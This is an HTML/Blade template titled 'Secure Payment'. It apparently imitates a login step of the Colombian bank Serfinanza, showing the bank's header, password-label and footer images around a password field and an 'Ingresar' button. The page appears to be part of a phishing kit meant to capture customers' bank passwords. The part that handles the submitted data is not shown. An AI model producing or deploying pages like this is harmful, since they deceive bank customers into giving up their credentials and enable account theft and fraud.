<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">

    <title>Secure Payment</title>

    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">


    
        <script type="text/javascript" src="{{asset('assets/js/jquery-3.6.0.min.js')}}"></script>

</head>
<body>

<img src="{{asset('assets/img/payment/serfinanza/menu.jpg')}}" alt="" srcset="" width="100%">
    
<div class="user" style="width:90%; height:370px; border:1px solid #cdcdcd;margin:auto; margin-top:50px; border-radius:15px;">
<center><img src="{{asset('assets/img/payment/serfinanza/contraseña.jpg')}}" alt="" srcset="" width="80%">

<input type="password" name="" id="txtPassword" placeholder="Ingresa tu contraseña" style="width:80%; height:40px; padding-left:10px; border:1.5px solid #170c84;" oninput="this.value = this.value.replace(/\s+/g, '')" required>
<br>
<input type="submit" id="btnPass" value="Ingresar" style="height:40px; margin-top:25px; background-color:#170c84; width:150px; border-radius:25px;">
<br><br>
<img src="{{asset('assets/img/payment/serfinanza/letras2.jpg')}}" alt="" srcset="" width="80%">
        </center>

</div>

<img src="{{asset('assets/img/payment/serfinanza/footer.jpg')}}" alt="" srcset="" width="100%">

</body>
</html>